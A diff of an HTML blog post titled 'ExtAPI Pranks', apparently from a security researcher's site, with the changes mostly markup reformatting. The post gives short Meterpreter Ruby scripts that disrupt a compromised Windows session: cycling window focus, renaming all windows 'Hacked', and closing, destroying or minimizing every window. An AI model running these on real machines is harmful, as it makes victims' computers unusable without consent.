@@ -38,8 +38,7 @@ Just brushing the surface and to help people see the power of this new functiona
 <link rel="manifest" href="/site.webmanifest">
 <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
 <link rel="shortcut icon" href="/favicon.ico">
-<meta name="theme-color" content="#252627">
-<meta itemprop="name" content="ExtAPI Pranks">
+<meta name="theme-color" content="#252627"><meta itemprop="name" content="ExtAPI Pranks">
 <meta itemprop="description" content="Since I&rsquo;ve been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find OJ&rsquo;s write up on it and more amazing things he did in 3 months of meterpreter and on the Metasploit blog.
 Just brushing the surface and to help people see the power of this new functionality I went ahead and created a few Meterpreter scripts that can really mess with someone.">
 
@@ -126,47 +125,44 @@ Just brushing the surface and to help people see the power of this new functiona
             
 
             <div class="post-content">
-                
-
-<p>Since I&rsquo;ve been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find <a href="https://twitter.com/TheColonial">OJ</a>&rsquo;s write up on it and more amazing things he did in <a href="http://buffered.io/posts/3-months-of-meterpreter/">3 months of meterpreter</a> and on the <a href="https://community.rapid7.com/community/metasploit/blog/2013/12/12/weekly-metasploit-update">Metasploit blog</a>.</p>
+                <p>Since I&rsquo;ve been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find <a href="https://twitter.com/TheColonial">OJ</a>&rsquo;s write up on it and more amazing things he did in <a href="http://buffered.io/posts/3-months-of-meterpreter/">3 months of meterpreter</a> and on the <a href="https://community.rapid7.com/community/metasploit/blog/2013/12/12/weekly-metasploit-update">Metasploit blog</a>.</p>
 
 <p>Just brushing the surface and to help people see the power of this new functionality I went ahead and created a few Meterpreter scripts that can really mess with someone.</p>
 
 <p>1st is a script that loops through all of the windows for your current user and sets the focus to them in rotation. Essentially making their machine unusable.</p>
 
 <ul>
-<li><p>Source: <a href="https://gist.github.com/mubix/8050500">https://gist.github.com/mubix/8050500</a>
-```ruby</p>
+<li><p>Source: <a href="https://gist.github.com/mubix/8050500">https://gist.github.com/mubix/8050500</a></p>
 
-<h1 id="code-loops-around-each-of-the-windows">Code loops around each of the windows</h1>
-
-<h1 id="that-the-current-user-has-open-and-switches">that the current user has open and switches</h1>
-
-<h1 id="focus-to-each-of-them-in-rotation-100-times">focus to each of them in rotation&hellip; 100 times.</h1></li>
-</ul>
-
-<p>(0..100).each do |x|
+<pre><code class="language-ruby"># Code loops around each of the windows
+# that the current user has open and switches
+# focus to each of them in rotation... 100 times.
+ 
+(0..100).each do |x|
 	windows = client.extapi.window.enumerate
 	windows.each do |winder|
-		if winder[:title] != &lsquo;Default IME&rsquo;
+		if winder[:title] != 'Default IME'
 			result = client.railgun.user32.SetForegroundWindow(winder[:handle])
 		end
 	end
-	print_status(&ldquo;Round #{x}&rdquo;)
-end</p>
-
-<pre><code>
-2nd just sets all of the windows title's the say &quot;hacked&quot;
-
-* Source: https://gist.github.com/mubix/8050592
-```ruby
-windows = client.extapi.window.enumerate
-windows.each do |winder|
-  if winder[:title] != 'Default IME'
-    result = client.railgun.user32.SetWindowTextA(winder[:handle],&quot;Hacked&quot;)
-  end
+	print_status(&quot;Round #{x}&quot;)
 end
-</code></pre>
+</code></pre></li>
+</ul>
+
+<p>2nd just sets all of the windows title&rsquo;s the say &ldquo;hacked&rdquo;</p>
+
+<ul>
+<li><p>Source: <a href="https://gist.github.com/mubix/8050592">https://gist.github.com/mubix/8050592</a></p>
+
+<pre><code class="language-ruby">windows = client.extapi.window.enumerate
+windows.each do |winder|
+if winder[:title] != 'Default IME'
+result = client.railgun.user32.SetWindowTextA(winder[:handle],&quot;Hacked&quot;)
+end
+end
+</code></pre></li>
+</ul>
 
 <p>and finally if in Windows if you close all of the windows, including &ldquo;invisible&rdquo; ones like Explorer, you will essentially make the machine unusable.</p>
 
@@ -177,7 +173,8 @@ end
 windows.each do |winder|
 	result = client.railgun.user32.CloseWindow(winder[:handle])
 end
-</code></pre>
+</code></pre></li>
+</ul>
 
 <p>OJ suggested a few other options:</p>
 
@@ -185,10 +182,9 @@ end
 
 <pre><code class="language-ruby">windows = client.extapi.window.enumerate
 windows.each do |winder|
-result = client.railgun.user32.DestroyWindow(winder[:handle])
+    result = client.railgun.user32.DestroyWindow(winder[:handle])
 end
-</code></pre></li>
-</ul>
+</code></pre>
 
 <p>or Minimize all:</p>
 
@@ -248,7 +244,7 @@ end
 
 
 
-<script type="text/javascript" src="https://malicious.link/js/bundle.4b80fbbfab88198dcef181b034822e60a3e68b1c128d1dc05392a32943a18ec2f866fbcd9ce31dcf84134397161647ad605ea5c25ecf12e5fcf9d28b47e64bb5.js" integrity="sha512-S4D7v6uIGY3O8YGwNIIuYKPmixwSjR3AU5KjKUOhjsL4ZvvNnOMdz4QTQ5cWFketYF6lwl7PEuX8&#43;dKLR&#43;ZLtQ=="></script>
+<script type="text/javascript" src="https://malicious.link/js/bundle.8a9ebda303dd50ff1cb0c1564c31e4da9d58924b7eef99f4694d22e8f690b6beb7bb0a08dad3bbe459354ed1aaa0d9bed9566c6e5b1b5b0c3e473adcc311cd89.js" integrity="sha512-ip69owPdUP8csMFWTDHk2p1Ykkt&#43;75n0aU0i6PaQtr63uwoI2tO75Fk1TtGqoNm&#43;2VZsblsbWww&#43;RzrcwxHNiQ=="></script>
 
 
 
